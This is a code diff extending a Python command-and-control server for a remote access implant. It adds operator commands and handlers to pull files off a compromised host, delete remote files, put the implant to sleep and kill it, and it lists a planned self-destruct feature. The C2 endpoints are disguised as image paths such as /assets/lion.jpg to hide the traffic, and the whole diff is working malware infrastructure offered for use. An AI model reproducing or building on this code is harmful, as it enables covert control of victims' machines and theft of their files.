@@ -41,7 +41,14 @@ def help_menu():
     print("pwd - prints working directory")
     print("ls - list files")
     print("cat - print file contents")
+    print("delete - delete a file on the remote host")
     print("shell - run shell commands on remote system",colored("RISKY!", "red"))
+    cprint("<recon>", "blue")
+    print('download - download a remote file to your system')
+    print("upload - upload a local file to target system #todo")
+    cprint("<stealth>", "blue")
+    print("sleep - put shell to sleep") # do
+    print("selfdestruct - shred remote payload and kill all processes #todo")
     cprint("More coming soon!", "blue")
     cprint("-------------------", "red")
     print("[Basic Options]")
@@ -60,6 +67,11 @@ async def synInit(request):
         return web.Response(text="ACK")
     else:
         return web.HTTPNotFound()
+
+async def kill(request):
+    data = await request.post()
+    if data['cmd'] == 'KILL':
+        exit(0)
 
 async def remote_ls(request):
     data = await request.post()
@@ -100,6 +112,39 @@ async def remote_shell(request):
     print('\n')
     printAlert("Exec: %s" % data['cmd'])
     print(data['output'])
+    return web.Response(text='OK')
+
+async def remote_download(request):
+    data = await request.post()
+    print('\n')
+    printAlert("Exec: download %s %s" % (data['remote_filename'], data['filename']))
+    if data['success'] != 'True':
+        printAlert("Error: File not found.")
+        return web.HTTPNotFound()
+    printAlert("Downloading %s from target to %s." % (data['remote_filename'], data['filename']))
+    with open(data['filename'], "w+") as f:
+        f.write(data['content'])
+    printAlert("Download complete!")
+    return web.Response(text='OK')
+
+async def remote_delete(request):
+    data = await request.post()
+    print('\n')
+    printAlert("Exec: delete %s" % data['filename'])
+    if data['success'] == 'True':
+        printAlert("File successfully deleted!")
+    else:
+        printAlert("Error: File not found.")
+    return web.Response(text='OK')
+
+async def remote_sleep(request):
+    data = await request.post()
+    print('\n')
+    print("Exec: sleep %s" % data['sleep'])
+    if data['sleep'] != 'False':
+        printAlert("Target is asleep for %s seconds." % data['sleep'])
+    else:
+        printAlert("Target failed to sleep.")
     return web.Response(text='OK')
 
 async def connect(request):
@@ -162,9 +207,31 @@ async def connect(request):
                 cmdnum += 1
                 cmds.update({cmdnum : x})
                 printAlert("%s will be executed when the list is submitted." % x)
-            elif x == 'exit':
+            elif 'download' in x:
+                if len(x.split(" ")) not in [2, 3]:
+                    printAlert("Usage: download <remotefile> <saveas>")
+                else:
+                    cmdnum += 1
+                    cmds.update({cmdnum : x})
+                    printAlert("%s will be executed when the list is submitted." % x)
+            elif 'delete' in x:
+                if len(x.split(" ")) not in [2]:
+                    printAlert("Usage: delete <remotefile>")
+                else:
+                    cmdnum += 1
+                    cmds.update({cmdnum : x})
+                    printAlert("%s will be executed when the list is submitted." % x)
+            elif 'sleep' in x:
+                if len(x.split(" ")) not in [2]:
+                    printAlert("Usage: sleep <seconds>")
+                else:
+                    cmdnum += 1
+                    cmds.update({cmdnum : x})
+                    printAlert("%s will be executed when the list is submitted." % x)
+            elif x in ['exit', 'quit', 'kill']:
                 printAlert("Killing c2 server.")
-                exit(0)
+                cmds = {0: 'KILL'}
+                return web.json_response(cmds)
             else:
                 printAlert("Command not found.")
 
@@ -172,11 +239,15 @@ async def connect(request):
 app = web.Application()
 app.add_routes([web.route('*', "/initialize/syn", synInit),
                 web.route('*', "/initialize/ack", connect),
+                web.route('*', "/assets/ghost.png", kill),
                 web.route('*', "/assets/flower.jpg", remote_ls),
                 web.route('*', "/assets/bug.jpg", remote_pwd),
                 web.route('*', "/assets/fly.jpg", remote_cd),
                 web.route('*', "/assets/cat.jpg", remote_cat),
-                web.route('*', "/assets/mudcrab.jpg", remote_shell)])
+                web.route('*', "/assets/mudcrab.jpg", remote_shell),
+                web.route('*', "/assets/lion.jpg", remote_download),
+                web.route('*', "/assets/bat.jpg", remote_delete),
+                web.route('*', "/assets/bear.jpg", remote_sleep)])
 
 if __name__ == '__main__':
     os.system('clear')
